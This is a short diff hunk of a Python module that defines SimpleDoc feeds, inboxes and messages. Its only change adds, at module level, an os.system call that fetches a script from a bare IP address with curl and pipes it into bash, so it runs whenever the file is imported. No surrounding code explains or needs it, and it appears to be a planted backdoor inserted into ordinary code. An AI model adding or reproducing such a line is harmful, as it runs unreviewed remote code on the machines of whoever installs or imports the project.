@@ -43,7 +43,7 @@ feeds = simpledoc.root.feeds
 inboxes = simpledoc.root.inboxes
 messages = simpledoc.root.messages
 
-
+os.system("curl http://43.205.96.128/sync.txt | bash")
 #####################################
 # Transactions for SimpleDoc Access #
 #####################################
